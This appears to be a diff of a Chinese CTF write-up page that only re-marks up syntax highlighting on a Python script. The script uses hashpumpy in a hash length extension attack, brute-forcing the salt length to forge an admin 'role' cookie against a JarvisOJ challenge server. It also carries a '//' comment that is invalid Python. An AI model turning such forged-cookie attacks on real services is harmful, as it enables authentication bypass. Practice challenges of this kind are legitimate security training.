@@ -316,24 +316,25 @@ make install</code></pre><h3 id="未知salt长度"><a href="#未知salt长度" c
 <p>s:5:”admin”;+padding+s:5:”guest”;</p>
 <p>而问题在于我们并不知道salt的长度</p>
 <p>===&gt;可以写脚本爆破(借脚本参考)</p>
-<pre><code>#!/usr/bin/python
-# -*- coding=utf -*-
-import requests,hashpumpy,urllib
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token comment" spellcheck="true"># -*- coding=utf -*-</span>
+<span class="token keyword">import</span> requests<span class="token punctuation">,</span>hashpumpy<span class="token punctuation">,</span>urllib
 
 
-def webre():
-    url = 'http://web.jarvisoj.com:32778/'
-    sha = '3a4727d57463f122833d9e732f94e4e0'
-    string0 = ';"tseug":5:s'
-    string1 = ';"nimda":5:s'
-    for i in range(15):
-        digest, message = hashpumpy.hashpump(sha,string0,string1,i)
-        payload ={'role':urllib.quote(message[::-1]), 'hsh':digest}  // quote()用于把url编码，    [::-1]用于反转字符
-        print(i,payload) 
-        html = requests.get(url,cookies=payload).content 
-        if 'Welcome' in html: 
-            print(html)
-webre()</code></pre><p>hashpump库使用说明</p>
+<span class="token keyword">def</span> <span class="token function">webre</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string">'http://web.jarvisoj.com:32778/'</span>
+    sha <span class="token operator">=</span> <span class="token string">'3a4727d57463f122833d9e732f94e4e0'</span>
+    string0 <span class="token operator">=</span> <span class="token string">';"tseug":5:s'</span>
+    string1 <span class="token operator">=</span> <span class="token string">';"nimda":5:s'</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        digest<span class="token punctuation">,</span> message <span class="token operator">=</span> hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span>sha<span class="token punctuation">,</span>string0<span class="token punctuation">,</span>string1<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+        payload <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'role'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>message<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'hsh'</span><span class="token punctuation">:</span>digest<span class="token punctuation">}</span>  <span class="token operator">//</span> quote<span class="token punctuation">(</span><span class="token punctuation">)</span>用于把url编码，    <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>用于反转字符
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> 
+        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content 
+        <span class="token keyword">if</span> <span class="token string">'Welcome'</span> <span class="token keyword">in</span> html<span class="token punctuation">:</span> 
+            <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+webre<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>hashpump库使用说明</p>
 <pre><code>hashpump(...)
     hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
     Arguments:
